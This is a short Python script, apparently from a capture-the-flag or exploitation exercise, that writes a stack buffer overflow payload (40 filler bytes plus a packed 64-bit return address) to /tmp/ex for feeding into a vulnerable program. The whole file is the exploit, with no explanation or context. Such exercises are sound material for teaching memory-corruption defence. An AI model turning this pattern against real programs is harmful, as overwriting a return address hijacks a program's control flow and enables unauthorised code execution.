from struct import pack

filler = b"A" * 40
ret = pack("<Q", 0x0000000000401146)

f = open("/tmp/ex", "wb")
f.write(filler + ret)
f.close()
